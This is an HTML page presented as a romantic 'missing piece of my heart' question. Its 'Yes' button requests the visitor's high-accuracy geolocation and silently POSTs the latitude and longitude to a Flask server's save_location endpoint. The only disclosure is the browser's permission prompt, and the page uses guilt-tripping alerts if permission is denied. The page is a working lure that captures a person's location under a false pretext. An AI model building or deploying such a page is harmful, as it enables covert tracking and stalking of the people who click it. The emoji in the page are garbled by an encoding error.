<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>My Heart's Location</title>
    <style>
        body {
            font-family: 'Cursive', Arial, sans-serif;
            text-align: center;
            margin-top: 100px;
            background-color: #ffe6f0;
        }
        button {
            padding: 15px 30px;
            font-size: 20px;
            cursor: pointer;
            background-color: #ff66a3;
            color: white;
            border: none;
            border-radius: 10px;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #ff3385;
        }
        #celebration {
            margin-top: 30px;
            font-size: 50px;
            display: none;
            animation: popAnimation 1.5s forwards;
        }
        @keyframes popAnimation {
            0% {
                transform: scale(1);
                opacity: 0;
            }
            30% {
                transform: scale(1.2);
                opacity: 1;
            }
            60% {
                transform: scale(1);
                opacity: 0.8;
            }
            100% {
                opacity: 0;
            }
        }
        .heart, .flower, .balloon {
            animation: float 3s infinite;
            position: absolute;
            z-index: 999;
            font-size: 30px;
        }
        .heart { animation-duration: 2s; }
        .flower { animation-duration: 2.5s; }
        .balloon { animation-duration: 3s; }
        @keyframes float {
            0% {
                transform: translateY(0) scale(1);
            }
            100% {
                transform: translateY(-300px) scale(1.5);
            }
        }
    </style>
</head>
<body>

    <h1>Would you be the missing piece of my heart?</h1>
    <button onclick="getLocation()">Yes</button>
    <div id="celebration">‚ù§Ô∏è üå∏ ‚ù§Ô∏è üå∏ ‚ù§Ô∏è</div>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(savePosition, showError, { enableHighAccuracy: true });
            } else {
                alert("Your browser doesn't support Geolocation.");
            }
        }

        function savePosition(position) {
            const lat = position.coords.latitude.toFixed(6); // More precise
            const lon = position.coords.longitude.toFixed(6);

            // Save to Flask server via POST request
            fetch('http://127.0.0.1:5000/save_location', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `latitude=${lat}&longitude=${lon}`
            })
            .then(response => response.json())
            .then(data => {
                console.log('Location saved:', data);
                document.getElementById("celebration").style.display = "block";
                triggerAnimation();  // Start animation after saving location
            })
            .catch(error => {
                console.error('Error saving location:', error);
            });
        }

        function triggerAnimation() {
            // Trigger hearts, flowers, and balloons popping
            createElement('‚ù§Ô∏è', 'heart');
            createElement('üå∏', 'flower');
            createElement('üéà', 'balloon');
        }

        function createElement(symbol, className) {
            const element = document.createElement('div');
            element.classList.add(className);
            element.innerText = symbol;
            document.body.appendChild(element);

            // Remove the element after animation completes
            setTimeout(() => {
                element.remove();
            }, 3000);
        }

        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    alert("You denied my love... üòî");
                    break;
                case error.POSITION_UNAVAILABLE:
                    alert("My heart couldn't find its way... üò¢");
                    break;
                case error.TIMEOUT:
                    alert("Love waited too long... ‚è≥üíî");
                    break;
                case error.UNKNOWN_ERROR:
                    alert("Something mysterious happened... üå´Ô∏èüíî");
                    break;
            }
        }
    </script>

</body>
</html>
